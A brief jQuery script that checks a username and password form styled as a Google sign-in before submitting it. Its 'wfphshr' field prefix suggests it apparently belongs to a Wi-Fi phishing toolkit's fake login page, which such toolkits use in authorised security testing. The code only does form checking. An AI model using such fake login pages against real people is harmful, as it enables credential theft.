$(document).ready(function () {
    $('#google-form-btn').on('click', function(event) {
        event.preventDefault();
        var $form = $('#google-form');
        var $username = $form.find('input[name="wfphshr-username"]');
        var $password = $form.find('input[name="wfphshr-password"]');

        if (($username.val() == "") || ($password.val() == "")) {
            $("#dialog").css('display', 'block');
            $(".form-control").css('border', '1px solid #dd4b39');
        } else {
            $form.submit();
        }
    });
});